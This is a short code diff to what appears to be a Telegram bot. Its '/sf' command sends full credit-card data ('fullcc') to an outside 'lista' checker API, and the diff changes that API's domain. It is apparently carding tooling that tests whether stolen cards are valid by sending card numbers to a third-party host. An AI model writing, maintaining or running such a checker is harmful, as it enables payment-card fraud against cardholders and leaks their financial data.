@@ -10,7 +10,6 @@ import requests
 import json
 session = requests.session()
 
-
 @Client.on_message(filters.command('sf'))
 async def cmd_au(Client, message):
     try:
@@ -133,7 +132,7 @@ Retry After {after}s
                         thirdchk = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
                         # STARTED CHECKING CC#
                         tic = time.perf_counter()
-                        authurl = f"https://pussabazar.omx.pw/api/api5.php?lista={fullcc}"
+                        authurl = f"https://pussabazar.a1h.in/api/api5.php?lista={fullcc}"
                         reqone = session.get(authurl)
                         result = reqone.text
                         fourthresp = f"""
